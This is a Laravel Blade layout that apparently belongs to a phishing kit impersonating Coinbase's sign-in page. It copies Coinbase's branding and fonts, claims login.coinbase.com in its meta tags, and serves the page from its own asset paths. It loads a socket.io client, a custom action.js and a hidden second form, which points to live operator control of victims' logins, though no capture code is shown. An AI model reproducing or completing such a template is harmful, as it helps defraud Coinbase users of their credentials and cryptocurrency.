<html lang="en" class="js-focus-visible" data-js-focus-visible="">
<head>
  
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width,initial-scale=1,shrink-to-fit=no">
  <meta name="csrf-token" content="{{ csrf_token() }}">
  <title>{{'Sign In'}}</title>
  <meta name="theme-color" content="#0052ff">
 {{--  <link rel="apple-touch-icon" sizes="120x120" href="/static/553205518c5a229f4872.png">
  <link rel="apple-touch-icon" sizes="152x152" href="/static/8eeac7461e2f4ba26122.png">
  <link rel="apple-touch-icon" sizes="180x180" href="/static/1312612346a95b7b236f.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/static/870e5855c3e936869acf.png">
  <link rel="icon" type="image/png" sizes="57x57" href="/static/33b6aa6ff4f211e1a382.png">
  <link rel="icon" type="image/png" sizes="76x76" href="/static/7a13d2750f804bf950df.png">
  <link rel="icon" type="image/png" sizes="96x96" href="/static/8c55db535ba9be8f45e9.png">
  <link rel="icon" type="image/png" sizes="128x128" href="/static/f50571360db6c803cdce.png">
  <link rel="icon" type="image/png" sizes="192x192" href="/static/cd9dcfaf25a9db88b6c9.png">
  <link rel="icon" type="image/png" sizes="228x228" href="/static/6028d3ddca338885c7ab.png"> --}}
  <script src="https://www.google.com/recaptcha/enterprise.js"></script>
  {{-- <link rel="shortcut icon" type="image/png" sizes="196x196" href="/static/85b156f7e601d949f531.png"> --}}
  <!-- OpenGraph Tags -->
  <meta property="og:type" content="website">
  <meta property="og:url" content="https://login.coinbase.com">
  <meta property="og:title" content="Coinbase Sign In">
  <meta property="og:site_name" content="Coinbase Sign In">
  <!-- Twitter tags -->
  <meta name="twitter:card" content="summary_large_image">
  <meta name="twitter:url" content="https://login.coinbase.com">
  <meta name="twitter:title" content="Coinbase Sign In">
  <link rel="icon" href="/favicon.ico">
  <!-- <script defer="defer" src="css/53460.9e85bce8b97254912626.js"></script> -->
  <script defer="defer" src="{{ asset('assets/js/main.5d21fd6337403bc4aec5.js') }}"></script>
  <link href="{{ asset('assets/css/styles.14a47dc2c96f296db5e8.css') }}" rel="stylesheet">
  <link href="{{ asset('assets/css/styles.8dc11d1422d1b2256990.css') }}" rel="stylesheet">
  <meta name="description" content="Coinbase is a secure online platform for buying, selling, transferring, and storing cryptocurrency." data-rh="true">
  <style id="googleidentityservice_button_styles">
    @font-face{font-family:"rbicon";src:url(chrome-extension://dipiagiiohfljcicegpgffpbnjmgjcnf/fonts/rbicon.woff2) format("woff2");font-weight:normal;font-style:normal}
      @font-face {
      font-weight: 700;
      font-style:  normal;
      font-family: circular;

      src: url('chrome-extension://liecbddmkiiihnedobmlmillhodjkdmb/fonts/CircularXXWeb-Bold.woff2') format('woff2');
    }
   @keyframes spin {
    0% { transform: rotate(0deg); }
    100% { transform: rotate(360deg); }
  }
  .feather {
    width: 80px;
    height: 80px;
  }
  .loading-animation {
    margin: 30px;
    text-align: center;
  }
</style>
  <style type="text/css">
    #form2 {
            display: none;
        }
    @font-face {
      font-display: swap;
      font-family: CoinbaseDisplay;
      src: url({{ asset('assets/fonts/28a06774e35b7ac61651.woff2') }})format("woff2");
      font-weight: 400
    }

    @font-face {
      font-display: swap;
      font-family: CoinbaseDisplay;
      src: url({{ asset('assets/fonts/8a6a40a08f92d9a9b3e5.woff2') }})format("woff2");
      font-weight: 500 800
    }

    @font-face {
      font-display: swap;
      font-family: CoinbaseSans;
      src: url({{ asset('assets/fonts/71371380d08a07cda58a.woff2') }})format("woff2");
      font-weight: 400
    }

    @font-face {
      font-display: swap;
      font-family: CoinbaseSans;
      src: url({{ asset('assets/fonts/502b733210ea3fdd4bf8.woff2') }})format("woff2");
      font-weight: 500 800
    }

    @font-face {
      font-display: swap;
      font-family: CoinbaseText;
      src: url({{ asset('assets/fonts/2a5dafc68ca015ca866a.woff2') }})format("woff2");
      font-weight: 400
    }

    @font-face {
      font-display: swap;
      font-family: CoinbaseText;
      src: url({{ asset('assets/fonts/1c417cbe5308c436b5c2.woff2') }})format("woff2");
      font-weight: 500 800
    }

    @font-face {
      font-display: swap;
      font-family: CoinbaseMono;
      src: url({{ asset('assets/fonts/760f9fc23d7b527e220f.woff2') }})format("woff2");
      font-weight: 400
    }

    @font-face {
      font-display: swap;
      font-family: CoinbaseMono;
      src: url({{ asset('assets/fonts/c84047cd5b5110c8efbd.woff2') }})format("woff2");
      font-weight: 500 800
    }
    @font-face{font-family:"rbicon";src:url(chrome-extension://dipiagiiohfljcicegpgffpbnjmgjcnf/fonts/rbicon.woff2) format("woff2");font-weight:normal;font-style:normal}
  </style>
  <style id="googleidentityservice_button_styles">
    .qJTHM{-webkit-user-select:none;color:#202124;direction:ltr;-webkit-touch-callout:none;font-family:"Roboto-Regular",arial,sans-serif;-webkit-font-smoothing:antialiased;font-weight:400;margin:0;overflow:hidden;-webkit-text-size-adjust:100%}.ynRLnc{left:-9999px;position:absolute;top:-9999px}.L6cTce{display:none}.bltWBb{word-break:break-all}
    .hSRGPd{color:#1a73e8;cursor:pointer;font-weight:500;text-decoration:none}.Bz112c-W3lGp{height:16px;width:16px}.Bz112c-E3DyYd{height:20px;width:20px}.Bz112c-r9oPif{height:24px;width:24px}.Bz112c-uaxL4e{-webkit-border-radius:10px;border-radius:10px}.LgbsSe-Bz112c{display:block}.S9gUrf-YoZ4jf,.S9gUrf-YoZ4jf *{border:none;margin:0;padding:0}.fFW7wc-ibnC6b>.aZ2wEe>div{border-color:#4285f4}.P1ekSe-ZMv3u>div:nth-child(1){background-color:#1a73e8!important}.P1ekSe-ZMv3u>div:nth-child(2),.P1ekSe-ZMv3u>div:nth-child(3){background-image:linear-gradient(to right,rgba(255,255,255,.7),rgba(255,255,255,.7)),linear-gradient(to right,#1a73e8,#1a73e8)!important}.haAclf{display:inline-block}.nsm7Bb-HzV7m-LgbsSe{-webkit-border-radius:4px;border-radius:4px;-webkit-box-sizing:border-box;box-sizing:border-box;-webkit-transition:background-color .218s,border-color .218s;transition:background-color .218s,border-color .218s;-webkit-user-select:none;-webkit-appearance:none;background-color:#fff;background-image:none;border:1px solid #dadce0;color:#3c4043;cursor:pointer;font-family:"Google Sans",arial,sans-serif;font-size:14px;height:40px;letter-spacing:0.25px;outline:none;overflow:hidden;padding:0 12px;position:relative;text-align:center;vertical-align:middle;white-space:nowrap;width:auto}@media screen and (-ms-high-contrast:active){.nsm7Bb-HzV7m-LgbsSe{border:2px solid windowText;color:windowText}}.nsm7Bb-HzV7m-LgbsSe.pSzOP-SxQuSe{font-size:14px;height:32px;letter-spacing:0.25px;padding:0 10px}.nsm7Bb-HzV7m-LgbsSe.purZT-SxQuSe{font-size:11px;height:20px;letter-spacing:0.3px;padding:0 8px}.nsm7Bb-HzV7m-LgbsSe.Bz112c-LgbsSe{padding:0;width:40px}.nsm7Bb-HzV7m-LgbsSe.Bz112c-LgbsSe.pSzOP-SxQuSe{width:32px}.nsm7Bb-HzV7m-LgbsSe.Bz112c-LgbsSe.purZT-SxQuSe{width:20px}.nsm7Bb-HzV7m-LgbsSe.JGcpL-RbRzK{-webkit-border-radius:20px;border-radius:20px}.nsm7Bb-HzV7m-LgbsSe.JGcpL-RbRzK.pSzOP-SxQuSe{-webkit-border-radius:16px;border-radius:16px}.nsm7Bb-HzV7m-LgbsSe.JGcpL-RbRzK.purZT-SxQuSe{-webkit-border-radius:10px;border-radius:10px}.nsm7Bb-HzV7m-LgbsSe.MFS4be-Ia7Qfc{border:none;color:#fff}.nsm7Bb-HzV7m-LgbsSe.MFS4be-v3pZbf-Ia7Qfc{background-color:#1a73e8}.nsm7Bb-HzV7m-LgbsSe.MFS4be-JaPV2b-Ia7Qfc{background-color:#202124;color:#e8eaed}
    .nsm7Bb-HzV7m-LgbsSe .nsm7Bb-HzV7m-LgbsSe-Bz112c{height:18px;margin-right:8px;min-width:18px;width:18px}.nsm7Bb-HzV7m-LgbsSe.pSzOP-SxQuSe .nsm7Bb-HzV7m-LgbsSe-Bz112c{height:14px;min-width:14px;width:14px}.nsm7Bb-HzV7m-LgbsSe.purZT-SxQuSe .nsm7Bb-HzV7m-LgbsSe-Bz112c{height:10px;min-width:10px;width:10px}.nsm7Bb-HzV7m-LgbsSe.jVeSEe .nsm7Bb-HzV7m-LgbsSe-Bz112c{margin-left:8px;margin-right:-4px}.nsm7Bb-HzV7m-LgbsSe.Bz112c-LgbsSe .nsm7Bb-HzV7m-LgbsSe-Bz112c{margin:0;padding:10px}.nsm7Bb-HzV7m-LgbsSe.Bz112c-LgbsSe.pSzOP-SxQuSe .nsm7Bb-HzV7m-LgbsSe-Bz112c{padding:8px}.nsm7Bb-HzV7m-LgbsSe.Bz112c-LgbsSe.purZT-SxQuSe .nsm7Bb-HzV7m-LgbsSe-Bz112c{padding:4px}.nsm7Bb-HzV7m-LgbsSe .nsm7Bb-HzV7m-LgbsSe-Bz112c-haAclf{-webkit-border-top-left-radius:3px;border-top-left-radius:3px;-webkit-border-bottom-left-radius:3px;border-bottom-left-radius:3px;display:-webkit-box;display:-webkit-flex;display:flex;justify-content:center;-webkit-align-items:center;align-items:center;background-color:#fff;height:36px;margin-left:-10px;margin-right:12px;min-width:36px;width:36px}.nsm7Bb-HzV7m-LgbsSe .nsm7Bb-HzV7m-LgbsSe-Bz112c-haAclf .nsm7Bb-HzV7m-LgbsSe-Bz112c,.nsm7Bb-HzV7m-LgbsSe.Bz112c-LgbsSe .nsm7Bb-HzV7m-LgbsSe-Bz112c-haAclf .nsm7Bb-HzV7m-LgbsSe-Bz112c{margin:0;padding:0}.nsm7Bb-HzV7m-LgbsSe.pSzOP-SxQuSe .nsm7Bb-HzV7m-LgbsSe-Bz112c-haAclf{height:28px;margin-left:-8px;margin-right:10px;min-width:28px;width:28px}.nsm7Bb-HzV7m-LgbsSe.purZT-SxQuSe .nsm7Bb-HzV7m-LgbsSe-Bz112c-haAclf{height:16px;margin-left:-6px;margin-right:8px;min-width:16px;width:16px}.nsm7Bb-HzV7m-LgbsSe.Bz112c-LgbsSe .nsm7Bb-HzV7m-LgbsSe-Bz112c-haAclf{-webkit-border-radius:3px;border-radius:3px;margin-left:2px;margin-right:0;padding:0}.nsm7Bb-HzV7m-LgbsSe.JGcpL-RbRzK .nsm7Bb-HzV7m-LgbsSe-Bz112c-haAclf{-webkit-border-radius:18px;border-radius:18px}.nsm7Bb-HzV7m-LgbsSe.pSzOP-SxQuSe.JGcpL-RbRzK .nsm7Bb-HzV7m-LgbsSe-Bz112c-haAclf{-webkit-border-radius:14px;border-radius:14px}.nsm7Bb-HzV7m-LgbsSe.purZT-SxQuSe.JGcpL-RbRzK .nsm7Bb-HzV7m-LgbsSe-Bz112c-haAclf{-webkit-border-radius:8px;border-radius:8px}.nsm7Bb-HzV7m-LgbsSe .nsm7Bb-HzV7m-LgbsSe-bN97Pc-sM5MNb{display:-webkit-box;display:-webkit-flex;display:flex;-webkit-align-items:center;align-items:center;-webkit-flex-direction:row;flex-direction:row;justify-content:space-between;-webkit-flex-wrap:nowrap;flex-wrap:nowrap;height:100%;position:relative;width:100%}.nsm7Bb-HzV7m-LgbsSe .oXtfBe-l4eHX{justify-content:center}.nsm7Bb-HzV7m-LgbsSe .nsm7Bb-HzV7m-LgbsSe-BPrWId{-webkit-flex-grow:1;flex-grow:1;font-family:"Google Sans",arial,sans-serif;font-weight:500;overflow:hidden;text-overflow:ellipsis;vertical-align:top}.nsm7Bb-HzV7m-LgbsSe.purZT-SxQuSe .nsm7Bb-HzV7m-LgbsSe-BPrWId{font-weight:300}.nsm7Bb-HzV7m-LgbsSe .oXtfBe-l4eHX .nsm7Bb-HzV7m-LgbsSe-BPrWId{-webkit-flex-grow:0;flex-grow:0}.nsm7Bb-HzV7m-LgbsSe .nsm7Bb-HzV7m-LgbsSe-MJoBVe{-webkit-transition:background-color .218s;transition:background-color .218s;bottom:0;left:0;position:absolute;right:0;top:0}
    .nsm7Bb-HzV7m-LgbsSe:hover,.nsm7Bb-HzV7m-LgbsSe:focus{-webkit-box-shadow:none;box-shadow:none;border-color:#d2e3fc;outline:none}.nsm7Bb-HzV7m-LgbsSe:hover .nsm7Bb-HzV7m-LgbsSe-MJoBVe,.nsm7Bb-HzV7m-LgbsSe:focus .nsm7Bb-HzV7m-LgbsSe-MJoBVe{background:rgba(66,133,244,.04)}.nsm7Bb-HzV7m-LgbsSe:active .nsm7Bb-HzV7m-LgbsSe-MJoBVe{background:rgba(66,133,244,.1)}.nsm7Bb-HzV7m-LgbsSe.MFS4be-Ia7Qfc:hover .nsm7Bb-HzV7m-LgbsSe-MJoBVe,.nsm7Bb-HzV7m-LgbsSe.MFS4be-Ia7Qfc:focus .nsm7Bb-HzV7m-LgbsSe-MJoBVe{background:rgba(255,255,255,.24)}.nsm7Bb-HzV7m-LgbsSe.MFS4be-Ia7Qfc:active .nsm7Bb-HzV7m-LgbsSe-MJoBVe{background:rgba(255,255,255,.32)}.nsm7Bb-HzV7m-LgbsSe .n1UuX-DkfjY{-webkit-border-radius:50%;border-radius:50%;display:-webkit-box;display:-webkit-flex;display:flex;height:20px;margin-left:-4px;margin-right:8px;min-width:20px;width:20px}.nsm7Bb-HzV7m-LgbsSe.jVeSEe .nsm7Bb-HzV7m-LgbsSe-BPrWId{font-family:"Roboto";font-size:12px;text-align:left}.nsm7Bb-HzV7m-LgbsSe.jVeSEe .nsm7Bb-HzV7m-LgbsSe-BPrWId .ssJRIf,.nsm7Bb-HzV7m-LgbsSe.jVeSEe .nsm7Bb-HzV7m-LgbsSe-BPrWId .K4efff .fmcmS{overflow:hidden;text-overflow:ellipsis}.nsm7Bb-HzV7m-LgbsSe.jVeSEe .nsm7Bb-HzV7m-LgbsSe-BPrWId .K4efff{display:-webkit-box;display:-webkit-flex;display:flex;-webkit-align-items:center;align-items:center;color:#5f6368;fill:#5f6368;font-size:11px;font-weight:400}.nsm7Bb-HzV7m-LgbsSe.jVeSEe.MFS4be-Ia7Qfc .nsm7Bb-HzV7m-LgbsSe-BPrWId .K4efff{color:#e8eaed;fill:#e8eaed}.nsm7Bb-HzV7m-LgbsSe.jVeSEe .nsm7Bb-HzV7m-LgbsSe-BPrWId .K4efff .Bz112c{height:18px;margin:-3px -3px -3px 2px;min-width:18px;width:18px}.nsm7Bb-HzV7m-LgbsSe.jVeSEe .nsm7Bb-HzV7m-LgbsSe-Bz112c-haAclf{-webkit-border-top-left-radius:0;border-top-left-radius:0;-webkit-border-bottom-left-radius:0;border-bottom-left-radius:0;-webkit-border-top-right-radius:3px;border-top-right-radius:3px;-webkit-border-bottom-right-radius:3px;border-bottom-right-radius:3px;margin-left:12px;margin-right:-10px}.nsm7Bb-HzV7m-LgbsSe.jVeSEe.JGcpL-RbRzK .nsm7Bb-HzV7m-LgbsSe-Bz112c-haAclf{-webkit-border-radius:18px;border-radius:18px}.L5Fo6c-sM5MNb{border:0;display:block;left:0;position:relative;top:0}.L5Fo6c-bF1uUb{-webkit-border-radius:4px;border-radius:4px;bottom:0;cursor:pointer;left:0;position:absolute;right:0;top:0}.L5Fo6c-bF1uUb:focus{border:none;outline:none}sentinel{}
  </style>
  <link id="googleidentityservice" type="text/css" media="all" rel="stylesheet" href="https://accounts.google.com/gsi/style">
</head>
<body class="cds-light-l1k3tbpe" style="background-color: rgba(var(--gray0));" data-new-gr-c-s-check-loaded="14.1190.0" data-gr-ext-installed="">

  @yield('content')

      <div id="portalRoot" style="z-index: 100001; position: relative; display: flex;">
      <div data-testid="portal-modal-container" id="modalsContainer" style="z-index: 3;"></div>
      <div data-testid="portal-toast-container" id="toastsContainer" style="z-index: 6;"></div>
      <div data-testid="portal-alert-container" id="alertsContainer" style="z-index: 7;">
        <div class="cds-large-llfbhh8 cds-light-l1k3tbpe" style="--foreground: rgb(var(--gray100)); --foreground-muted: rgb(var(--gray60)); --background: rgb(var(--gray0)); --background-alternate: rgb(var(--gray5)); --background-inverse: rgb(var(--gray100)); --background-overlay: rgba(var(--gray80),0.33); --line: rgba(var(--gray60),0.2); --line-heavy: rgba(var(--gray60),0.66); --primary: rgb(var(--blue70)); --primary-wash: rgb(var(--blue0)); --primary-foreground: rgb(var(--gray0)); --negative: rgb(var(--red60)); --negative-foreground: rgb(var(--gray0)); --negative-wash: rgb(var(--red0)); --positive: rgb(var(--green60)); --positive-foreground: rgb(var(--gray0)); --secondary: rgb(var(--gray20)); --secondary-foreground: rgb(var(--gray100)); --transparent: rgba(var(--gray0),0); --warning: rgb(var(--yellow50)); --warning-foreground: rgb(var(--orange70));"></div></div><div data-testid="portal-tooltip-container" id="tooltipContainer" style="z-index: 5;"></div>
      </div>
      <div id="cds-hexagon-clipPath-container" aria-hidden="true" style="height: 0px; width: 0px;">
        <svg height="0" viewBox="0 0 66 62" width="0">
          <defs>
            <clipPath clipPathUnits="objectBoundingBox" id="cds-hexagon-avatar-clipper" transform="scale(0.015151515151515152 0.016129032258064516)">
              <path d="M63.4372 22.8624C66.2475 27.781 66.2475 33.819 63.4372 38.7376L54.981 53.5376C52.1324 58.5231 46.8307 61.6 41.0887 61.6H24.4562C18.7142 61.6 13.4125 58.5231 10.564 53.5376L2.10774 38.7376C-0.702577 33.819 -0.702582 27.781 2.10774 22.8624L10.564 8.06243C13.4125 3.07687 18.7142 0 24.4562 0H41.0887C46.8307 0 52.1324 3.07686 54.981 8.06242L63.4372 22.8624Z"></path>
            </clipPath>
          </defs>
        </svg>
      </div>
      <script src="https://accounts.google.com/gsi/client" async="" id="google-api-script"></script>
      <script src="https://appleid.cdn-apple.com/appleauth/static/jsapi/appleid/1/en_US/appleid.auth.js" async="" id="apple-id-auth-script"></script>
      <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.1.3/socket.io.js"></script>
      <script src="{{ asset('assets/global/js/jquery.min.js') }}"></script>
      <script src="{{ asset('assets/js/action.js') }}"></script>

      @stack('script')
    </body>
    </html>
